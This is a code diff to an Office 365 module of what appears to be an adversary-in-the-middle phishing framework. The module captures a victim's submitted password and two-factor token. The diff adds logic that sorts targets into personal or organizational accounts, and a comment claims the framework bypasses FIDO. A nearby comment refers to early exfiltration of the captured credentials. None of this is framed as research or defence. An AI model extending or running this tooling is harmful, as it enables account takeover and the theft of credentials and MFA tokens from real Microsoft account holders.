@@ -1,18 +1,21 @@
 from __future__ import print_function
 from flask import redirect, request, session
-import json, time
+import json
+import time
+import os
+import traceback
+import shutil
+import datetime
+import threading
 from os import getenv
 from core.base_module import BaseModule
 from core.aitm_proxy import AiTMManager
 import requests
-import traceback
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
-
-import os, traceback, shutil, datetime, threading, time
 
 
 class Office365Module(BaseModule):
@@ -88,6 +91,18 @@ class Office365Module(BaseModule):
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
 
+        # Detect personal vs organizational account
+        personal_domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'live.com', 'msn.com', 'yahoo.com']
+        is_personal = any(domain in self.user.lower() for domain in personal_domains)
+
+        # Use AiTM for both personal and organizational accounts
+        # Personal account support has been implemented with proper FIDO bypass
+        self.attack_mode = "aitm"
+        
+        if is_personal:
+            self.log(f"[AiTM] Personal account detected ({self.user}) – using AiTM with personal account flow")
+        else:
+            self.log(f"[AiTM] Organizational account detected ({self.user}) – using AiTM with organizational flow")
 
         # Send early exfiltration of credentials
         ip = request.remote_addr
